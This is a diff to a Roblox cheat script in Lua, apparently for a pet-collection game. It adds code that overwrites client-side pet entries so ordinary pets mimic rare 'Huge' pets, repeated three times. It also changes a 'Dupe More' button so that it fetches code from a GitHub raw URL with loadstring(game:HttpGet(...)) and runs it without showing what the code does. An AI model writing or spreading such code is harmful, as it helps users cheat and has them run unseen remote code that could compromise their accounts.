@@ -549,8 +549,30 @@ Tab:AddButton({
 	Callback = function()
 		local lib = require(game.ReplicatedStorage.Library)
 
-		local fromPet = "Ninja Turtle"
-		local toPet = "Huge Rave Meebo in a Spaceship"
+		local fromPet = "Dog"
+		local toPet = "Huge Punksky"
+		
+		for i,v in pairs(lib.Directory.Pets[fromPet]) do
+		  lib.Directory.Pets[fromPet][i] = nil
+		end
+		for i,v in pairs(lib.Directory.Pets[toPet]) do
+		  lib.Directory.Pets[fromPet][i] = v
+		end
+		local lib = require(game.ReplicatedStorage.Library)
+
+		local fromPet = "Cyborg Cat"
+		local toPet = "Huge Cyber Agony"
+		
+		for i,v in pairs(lib.Directory.Pets[fromPet]) do
+		  lib.Directory.Pets[fromPet][i] = nil
+		end
+		for i,v in pairs(lib.Directory.Pets[toPet]) do
+		  lib.Directory.Pets[fromPet][i] = v
+		end
+		local lib = require(game.ReplicatedStorage.Library)
+
+		local fromPet = "Cyborg Ducky"
+		local toPet = "Huge Red Panda"
 		
 		for i,v in pairs(lib.Directory.Pets[fromPet]) do
 		  lib.Directory.Pets[fromPet][i] = nil
@@ -568,11 +590,7 @@ Tab:AddButton({
 Tab:AddButton({
 	Name = "Dupe More🤑",
 	Callback = function()
-		local args = {
-			[1] = "8b3cefe0434e435facce0c00d74abadc"
-		}
-		
-		game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Favorite"):FireServer(unpack(args))		
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/PyroXHUB/HUGEGamess/main/asda'))()
   	end    
 })
 Tab:AddDropdown({
